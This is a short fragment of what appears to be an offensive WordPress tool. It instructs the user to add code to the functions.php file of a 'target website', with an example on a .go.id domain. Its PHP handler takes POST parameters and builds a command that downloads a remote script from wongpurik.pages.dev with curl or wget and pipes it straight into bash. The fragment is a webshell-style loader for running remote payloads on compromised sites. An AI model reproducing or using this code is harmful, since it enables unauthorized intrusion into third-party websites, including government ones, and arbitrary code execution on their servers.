...
<p class="text-center">How to use? Add the above code in the functions.php file on the target website. | example: https://example.go.id/wp-content/themes/[themes name]/functions.php</p>
    ...
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['method']) && isset($_POST['pathnyo'])) {
        $method = $_POST['method'];
        $pathnyo = rtrim($_POST['pathnyo'], '/') . '/';
        $command = '';
        if ($method == 'curl') {
            $command = 'bash -c "$(curl -fsSL https://wongpurik.pages.dev/source/y)"';
        } elseif ($method == 'wget') {
            $command = 'bash -c "$(wget --no-verbose -O- https://wongpurik.pages.dev/source/y)"';
        }
